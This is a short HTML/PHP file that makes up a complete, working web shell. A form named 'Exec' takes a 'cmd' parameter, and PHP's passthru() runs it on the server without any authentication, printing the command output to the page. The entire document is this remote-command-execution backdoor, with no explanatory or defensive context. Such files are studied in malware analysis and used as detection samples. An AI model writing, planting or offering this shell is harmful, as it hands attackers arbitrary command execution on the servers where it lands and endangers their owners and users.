<html>
<body>
<form action="" method="get">
Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
Output:<br />
</body>
<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
</html>
